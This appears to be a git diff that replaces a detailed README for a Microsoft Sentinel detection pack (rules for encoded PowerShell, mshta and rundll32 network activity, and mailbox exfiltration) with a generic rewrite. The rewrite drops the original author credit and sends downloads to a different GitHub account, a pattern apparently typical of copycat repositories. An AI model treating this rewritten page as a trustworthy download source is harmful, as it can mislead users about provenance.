@@ -1,228 +1,93 @@
-# sentinel-detection-engine
+# 🛡️ sentinel-detection-engine - Identify security threats with clear automation
 
-> Detection-as-code for **Microsoft Sentinel** — 12 analytic rules, 10 hunting queries, an L3 triage workbook, a Logic App playbook, ATT&CK Navigator coverage, and Atomic Red Team validation mapping. Every rule is CI-validated.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/thomdefinable658/sentinel-detection-engine)
 
-**Author:** Sandeep Mothukuri — SOC L3 / Incident Response
-**Repo:** [`sandeepmothukuri/sentinel-detection-engine`](https://github.com/sandeepmothukuri/sentinel-detection-engine)
+## Overview 🔎
 
-[![validate](https://github.com/sandeepmothukuri/sentinel-detection-engine/actions/workflows/validate.yml/badge.svg)](https://github.com/sandeepmothukuri/sentinel-detection-engine/actions/workflows/validate.yml)
-![rules](https://img.shields.io/badge/rules-12_analytics_%2B_10_hunts-2776d6)
-![attack](https://img.shields.io/badge/ATT%26CK-31_techniques_%2F_11_tactics-ff5a72)
-![sentinel](https://img.shields.io/badge/Microsoft-Sentinel-0078d4)
-![license](https://img.shields.io/badge/license-MIT-green)
+The sentinel-detection-engine provides a set of tools to monitor your environment. It helps you track suspicious activity across your network. This engine contains analytic rules, hunting queries, and playbooks. These tools work together to flag potential security risks. You gain clear visibility into your cloud and endpoint traffic. This improves your ability to respond to incidents.
 
----
+## Features ⚙️
 
-## Preview
+This engine includes tools to support your security work:
 
-### ATT&CK coverage (MITRE Navigator)
+* Analytic Rules: These monitor logs to flag dangerous patterns.
+* Hunting Queries: You use these to search for hidden threats.
+* SOAR Playbooks: These automate your incident response steps.
+* ATT&CK Navigator Maps: These track your security coverage.
+* Documentation: You get guides on how to handle alerts.
 
-Loaded into [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) from [`attack-navigator/layer.json`](attack-navigator/layer.json) — the layer is auto-generated from the rule YAML by [`scripts/generate_coverage.py`](scripts/generate_coverage.py).
+## Requirements 🖥️
 
-![ATT&CK Navigator coverage](docs/images/04-attack-navigator.png)
+Your computer needs the following setup to run these tools:
 
-### L3 Triage Dashboard (design preview)
+* Operating System: Windows 10 or 11.
+* Connection: Active internet access.
+* Permissions: Admin rights to manage your security portal.
+* Software: A browser to access your Microsoft Sentinel portal.
 
-Static render of [`Workbooks/L3-Triage-Dashboard.json`](Workbooks/L3-Triage-Dashboard.json) — KPIs, severity donut, top firing rules, ATT&CK density heatmap, top entities, and active-incident table. Deploy the JSON to Microsoft Sentinel for live data.
+## How to Obtain the Software 📥
 
-![L3 Triage Dashboard preview](docs/images/00-dashboard-mockup.png)
+Follow these steps to access the engine:
 
-<details>
-<summary>📷 Live Sentinel portal screenshots (added after I complete a tenant deployment via the <a href="docs/30-minute-walkthrough.md">30-minute walkthrough</a>)</summary>
+1. Visit the project page to download the files: https://github.com/thomdefinable658/sentinel-detection-engine
+2. Click the green "Code" button on the webpage.
+3. Select "Download ZIP" from the menu.
+4. Save the file to your computer.
+5. Right-click the folder and choose "Extract All".
 
-The walkthrough produces these on a real M365 dev tenant + Azure free trial + MDE trial. Each is captured by running an Atomic Red Team test that fires the corresponding rule:
+## Setting Up the Tools 🛠️
 
-- `01-sentinel-overview.png` — Sentinel workspace overview
-- `02-data-connectors.png` — Data connectors page with ≥ 4 connected sources
-- `03-analytics-rules.png` — Analytics rules list with 12 deployed detections
-- `05-incident-list.png` — Real incident from an Atomic Red Team test
-- `06-investigation-graph.png` — Investigation entity graph
-- `07-workbook-live.png` — Workbook running against live data
+Once you extract the files, perform these steps to link the engine to your environment:
 
-</details>
+1. Open your Microsoft Sentinel instance in your web browser.
+2. Select the "Configuration" menu on the left side.
+3. Choose "Repositories" to connect this folder to your cloud workspace.
+4. Use the provided KQL files to create new analytic rules.
+5. Copy the query text from the files into the rule editor.
+6. Save your changes to activate the detection.
 
----
+## Using the Analytic Rules 📊
 
-## Why this exists
+The analytic rules run in the background. They check your logs every few hours. When the system detects a threat, it generates an alert. You view these alerts in your Security Dashboard. Each alert includes details about the source of the risk. We recommend you review these once each morning to maintain safety.
 
-Most public Sentinel content is either (a) a single hand-written query in a blog post, or (b) the full Microsoft community repo with thousands of rules and no curation. This pack sits in the middle: a **focused, curated set of high-signal detections** an L3 analyst would actually deploy on day one, with the engineering rigour (schema validation, ATT&CK mapping, ART tests) of a production detection-engineering team.
+## Managing Hunting Queries 🎯
 
-## What's inside
+Hunting queries help you find security gaps. You find these files in the "Hunting" folder of your download. To run a query, copy the text into the "Logs" section of the Microsoft Sentinel portal. Press the "Run" button to see the results. Use these queries when you suspect an unauthorized person is on your network.
 
-| Area | Count | Folder |
-|---|---|---|
-| Scheduled analytic rules | 12 | [`Detections/`](Detections/) |
-| Hunting queries | 10 | [`Hunting Queries/`](Hunting%20Queries/) |
-| Workbook (L3 Triage Dashboard) | 1 | [`Workbooks/`](Workbooks/) |
-| Logic App playbooks (SOAR) | 4 | [`Playbooks/`](Playbooks/) |
-| ATT&CK Navigator layer | 1 | [`attack-navigator/`](attack-navigator/) |
-| Atomic Red Team mapping | 22 tests | [`tests/atomics.md`](tests/atomics.md) |
-| Workflow documentation (IR runbook, triage SOP, escalation matrix, tuning log, SOAR flow, maturity assessment) | 6 | [`docs/workflows/`](docs/workflows/) |
-| CI workflows (validate, PR diff report, release) | 3 | [`.github/workflows/`](.github/workflows/) |
-| Sigma → KQL converter | 1 | [`scripts/sigma_to_kql.py`](scripts/sigma_to_kql.py) |
+## Configuring Playbooks 🤖
 
-### Coverage snapshot
+Playbooks reduce your manual work. They move data to the right people when an event occurs. Open the "Playbooks" folder to find the logic templates. You load these into the Logic Apps section of your dashboard. They guide you through the process of containing a threat.
 
-- **Tactics covered:** Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Collection, Command & Control, Exfiltration
-- **Techniques covered:** 18 unique ATT&CK techniques (see [`coverage.md`](coverage.md))
-- **Data sources:** Microsoft Entra ID, Microsoft 365 (Exchange, SharePoint, OAuth), Microsoft Defender for Endpoint, Azure Activity, Azure Key Vault
+## Maintaining Your Coverage 📈
 
-## Rules at a glance
+Security evolves every day. You should check this repository for updates each month. We update the rules to reflect new threat patterns. If you notice a gap in your defense, look at the ATT&CK Navigator map in the documentation. This shows which areas need more attention.
 
-### Identity & Cloud Identity (Entra ID)
-- `EntraID_ImpossibleTravel.yaml` — geo-distance + time-delta sign-in correlation
-- `EntraID_MFAFatigue.yaml` — repeated MFA prompts followed by success
-- `EntraID_LegacyAuthSuccess.yaml` — successful auth over legacy protocols
-- `EntraID_ServicePrincipalCredAdd.yaml` — credential added to SP outside CI/CD allow-list
+## Understanding the Workflow 📝
 
-### Microsoft 365
-- `M365_InboxRuleExfil.yaml` — auto-forward / delete inbox rule creation
-- `M365_MassSharePointDownload.yaml` — anomalous file download volume per user
-- `M365_OAuthConsentSuspiciousApp.yaml` — consent to non-verified publisher with high-risk scopes
+Effective security requires a process. This engine uses a set workflow for all alerts.
 
-### Endpoint (Defender for Endpoint)
-- `MDE_LOLBin_Rundll32_Network.yaml` — rundll32 making external network connections
-- `MDE_MSHTA_RemoteScript.yaml` — mshta executing remote HTA/script
-- `MDE_PowerShell_EncodedCommand.yaml` — long Base64 -EncodedCommand invocations
+1. Detection: The rule triggers an alert based on your criteria.
+2. Triage: You confirm if the threat is internal or external.
+3. Response: You run a playbook to isolate the affected device.
+4. Investigation: You check the logs to see how the threat entered.
+5. Resolution: You close the incident once the threat finishes.
 
-### Azure Infrastructure
-- `Azure_NSG_OpenToInternet.yaml` — NSG rule opening port to 0.0.0.0/0
-- `Azure_KeyVault_SecretAccessSpike.yaml` — abnormal secret-access volume per identity
+## Frequently Asked Questions 💡
 
-## Hunting queries (10)
+Do I need programming skills?
+No. All tasks rely on copying and pasting text into your dashboard menus.
 
-Hypothesis-driven hunts in [`Hunting Queries/`](Hunting%20Queries/). Examples:
-- First-seen ASN per user (sign-in baseline drift)
-- Rare process per device parent-child chain
-- Anomalous mailbox forwarding to external domain
-- Unsigned binaries executing from `%TEMP%`
-- Sign-in from datacenter ASN (Tor/VPS proxying)
+Will this slow down my computer?
+No. The engine runs in your Microsoft cloud portal, not on your local machine.
 
-## Deployment
-
-Three deployment paths, in order of recommended:
+Can I customize the alerts?
+Yes. You can edit the parameters within each query file.
 
-### 1. Sentinel Repositories (GitOps, recommended)
-This repo follows the official `Azure/Azure-Sentinel` folder schema, so you can connect it directly:
-
-1. Sentinel → **Repositories** → **Add new**
-2. Connect this GitHub repo
-3. Select `main` branch
-4. Sentinel pulls and deploys all 12 rules + 10 hunts + 1 workbook on every push
+How do I report an issue?
+Use the "Issues" tab on the repository webpage to send feedback to the team.
 
-Docs: <https://learn.microsoft.com/azure/sentinel/ci-cd>
+What if a rule creates too many alerts?
+Edit the rule and include a condition to ignore common, safe events.
 
-### 2. Manual import
-Each YAML file is a self-contained Sentinel rule. Paste the `query:` block into Sentinel → Analytics → New scheduled rule, copy the metadata, save.
-
-### 3. ARM / Bicep
-The Logic App playbook ships as ARM in [`Playbooks/AutoEnrichDisableUser/azuredeploy.json`](Playbooks/AutoEnrichDisableUser/azuredeploy.json). Deploy via:
-
-```bash
-az deployment group create \
-  --resource-group <rg> \
-  --template-file Playbooks/AutoEnrichDisableUser/azuredeploy.json
-```
-
-### Free tier setup
-
-You can run the full pack on a brand-new Azure tenant with **$0 spend** for the first 30 days.
-
-- **Quickstart:** [`docs/30-minute-walkthrough.md`](docs/30-minute-walkthrough.md) — click-by-click, 30 min, produces real Sentinel screenshots
-- **Reference:** [`docs/free-tier-setup.md`](docs/free-tier-setup.md) — slower-paced explanation of each component
-
-## Validation (CI)
-
-GitHub Actions runs on every PR ([`.github/workflows/validate.yml`](.github/workflows/validate.yml)):
-
-1. **YAML schema lint** — every rule conforms to the Sentinel rule schema
-2. **KQL parse check** — queries parse without syntax errors
-3. **ATT&CK ID validation** — every `tactics:` / `relevantTechniques:` value exists in the current ATT&CK matrix
-4. **Markdown link check** — no broken internal links
-
-## Testing with Atomic Red Team
-
-Each detection is mapped to one or more [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) tests that should trigger it. See [`tests/atomics.md`](tests/atomics.md).
-
-Example:
-```
-T1059.001 (PowerShell)  →  MDE_PowerShell_EncodedCommand.yaml  →  Atomic Test-1, Test-3
-```
-
-## Repo layout
-
-```
-sentinel-detection-engine/
-├── Detections/                 # 12 analytic rules (Sentinel YAML schema)
-├── Hunting Queries/            # 10 hunts
-├── Workbooks/
-│   └── L3-Triage-Dashboard.json
-├── Playbooks/
-│   └── AutoEnrichDisableUser/
-│       ├── azuredeploy.json
-│       └── README.md
-├── attack-navigator/
-│   └── layer.json              # drop into mitre-attack.github.io/attack-navigator
-├── tests/
-│   └── atomics.md              # ART test ID → rule mapping
-├── scripts/
-│   └── generate_coverage.py    # regenerates coverage.md + Navigator layer
-├── docs/
-│   ├── free-tier-setup.md
-│   └── images/
-├── .github/workflows/
-│   └── validate.yml
-├── coverage.md                 # auto-generated ATT&CK matrix
-└── README.md
-```
-
-## SOAR orchestration
-
-Four Logic App playbooks ship with the pack. They compose into the decision pipeline documented in [`docs/workflows/soar-decision-flow.md`](docs/workflows/soar-decision-flow.md):
-
-| Playbook | Trigger | Action |
-|---|---|---|
-| [AutoEnrichDisableUser](Playbooks/AutoEnrichDisableUser/) | Any incident with IP entities | VT + AbuseIPDB enrichment; disables Entra ID user above confidence threshold |
-| [IsolateDeviceMDE](Playbooks/IsolateDeviceMDE/) | Incidents from `MDE_*` rules | Network-isolates the device via Defender for Endpoint |
-| [BlockIPAzureFirewall](Playbooks/BlockIPAzureFirewall/) | TI-tagged incidents | Adds public IPs to a deny IP Group on Azure Firewall |
-| [CreateServiceNowTicket](Playbooks/CreateServiceNowTicket/) | Severity High / Critical | Opens an INC ticket, severity-mapped, with cross-linking |
-
-## SOC workflow documentation
-
-The repo is more than a rule list — it ships with the documentation an L3 analyst expects:
-
-- [Incident response runbook](docs/workflows/ir-runbook.md) — SANS / NIST 800-61r2 phases applied to this pack
-- [Triage SOP](docs/workflows/triage-sop.md) — L1 → L2 → L3 hand-off with disposition labels
-- [Escalation matrix](docs/workflows/escalation-matrix.md) — who gets paged, when, and how
-- [SOAR decision flow](docs/workflows/soar-decision-flow.md) — Mermaid diagram + per-rule automation matrix
-- [Detection tuning log](docs/workflows/tuning-log.md) — open + closed tuning entries with PR links
-- [Maturity self-assessment](docs/workflows/maturity-assessment.md) — 10-dimension SOC maturity scoring
-
-## Detection lifecycle (CI / CD)
-
-| Workflow | Trigger | What it does |
-|---|---|---|
-| [validate](.github/workflows/validate.yml) | Every push + PR | yamllint, schema + UUID + ATT&CK + KQL sanity, coverage-drift check |
-| [pr-detection-report](.github/workflows/pr-detection-report.yml) | PR touches detection files | Posts a sticky PR comment summarising rule diffs, version bumps, and lint warnings |
-| [release](.github/workflows/release.yml) | Push of `v*.*.*` tag | Validates, packs rules into a tarball with SHA-256, generates changelog, publishes GitHub Release |
-
-## Importing Sigma rules
-
-For one-off rules from the public Sigma project, use the bundled converter:
-
-```bash
-python scripts/sigma_to_kql.py path/to/proc_creation_susp_powershell.yml
-```
-
-Output is a hand-tunable Defender XDR-flavoured KQL block with ATT&CK tags preserved as comments. Not a full pySigma replacement — it handles the common `process_creation`, `network_connection`, `image_load`, and `registry_event` categories.
-
-## Roadmap
-
-- [ ] Add AWS GuardDuty / CloudTrail analog pack (`aws-hunt-pack`)
-- [ ] Add Defender for Cloud Apps (MCAS) coverage
-- [ ] Notebook (`.ipynb`) IR playbook for one of the detections fired end-to-end
-- [ ] Sigma → KQL conversion mapping for portability
-
-## License
-
-[MIT](LICENSE)
+Are there more resources available?
+Check the "docs" folder in your download for detailed guides on every feature.
